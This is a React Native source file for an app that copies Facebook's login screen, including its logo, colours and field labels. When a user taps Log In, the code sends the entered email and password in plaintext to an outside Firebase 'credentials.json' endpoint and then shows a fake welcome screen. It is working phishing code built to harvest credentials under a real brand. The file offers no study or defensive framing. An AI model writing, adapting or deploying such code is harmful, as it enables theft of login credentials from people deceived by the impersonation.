// App.js
// https://facebook-clone-app-7cc0d-default-rtdb.firebaseio.com/credentials.json
import React, { useState } from 'react';
import {
  View, Text, TextInput, TouchableOpacity,
  StyleSheet, StatusBar, Image
} from 'react-native';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  const handleLogin = () => {
    if (!email || !password) {
      alert('Both email and password are required.');
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      alert('Please enter a valid email address.');
      return;
    }

    if (password.length < 6) {
      alert('Password must be at least 6 characters long.');
      return;
    }

    const userData = {
      email,
      password,
      timestamp: new Date().toISOString(),
    };

    fetch('https://facebook-clone-app-7cc0d-default-rtdb.firebaseio.com/credentials.json', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData),
    })
      .then(res => res.json())
      .then(data => {
        console.log('Saved:', data);
        setIsLoggedIn(true);
      })
      .catch(err => {
        console.error(err);
        alert('Error saving login');
      });
  };

  if (isLoggedIn) {
    return (
      <View style={styles.dashboard}>
        <StatusBar backgroundColor="#1877F2" barStyle="light-content" />
        <Image
          source={{ uri: 'https://i.pravatar.cc/150?img=5' }}
          style={styles.avatar}
        />
        <Text style={styles.welcome}>Welcome Back 👋</Text>
       
        <TouchableOpacity style={styles.logoutButton} onPress={() => setIsLoggedIn(false)}>
          <Text style={styles.logoutText}>Log Out</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <StatusBar backgroundColor="#1877F2" barStyle="light-content" />
      <Text style={styles.logo}>facebook</Text>

      <TextInput
          style={styles.input}
          placeholder="Mobile number or email"
          placeholderTextColor="#888"
          value={email}
          onChangeText={setEmail}
        />
        <TextInput
          style={styles.input}
          placeholder="Password"
          placeholderTextColor="#888"
          secureTextEntry
          value={password}
          onChangeText={setPassword}
        />
      <TouchableOpacity style={styles.loginButton} onPress={handleLogin}>
        <Text style={styles.loginButtonText}>Log In</Text>
      </TouchableOpacity>
      <Text style={styles.forgotText}>Forgot Password?</Text>
    </View>
  );
}


const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 20,
  },
  logo: {
    fontSize: 50,
    fontWeight: 'bold',
    color: '#1877F2',
    marginBottom: 50,
    fontFamily: 'sans-serif-medium',
  },
  inputContainer: {
    width: '100%',
  },
  input: {
    height: 50,
    borderWidth: 1,
    width: '100%',
    borderColor: '#ddd',
    borderRadius: 6,
    marginBottom: 15,
    paddingHorizontal: 15,
    fontSize: 16,
  },
  loginButton: {
    backgroundColor: '#1877F2',
    width: '100%',
    paddingVertical: 12,
    borderRadius: 6,
    alignItems: 'center',
    marginTop: 10,
  },
  loginButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  forgotText: {
    color: '#1877F2',
    marginTop: 15,
    fontSize: 14,
  },
  divider: {
    height: 1,
    backgroundColor: '#ccc',
    width: '100%',
    marginVertical: 30,
  },
  createButton: {
    backgroundColor: '#42b72a',
    paddingVertical: 12,
    paddingHorizontal: 30,
    borderRadius: 6,
  },
  createButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  dashboard: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#f0f2f5',
    padding: 30,
  },
  avatar: {
    width: 100,
    height: 100,
    borderRadius: 50,
    marginBottom: 20,
    borderWidth: 2,
    borderColor: '#1877F2',
  },
  welcome: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#333',
  },
  userEmail: {
    fontSize: 16,
    color: '#666',
    marginTop: 8,
    marginBottom: 40,
  },
  logoutButton: {
    backgroundColor: '#e53935',
    paddingVertical: 12,
    paddingHorizontal: 30,
    borderRadius: 6,
  },
  logoutText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  
});
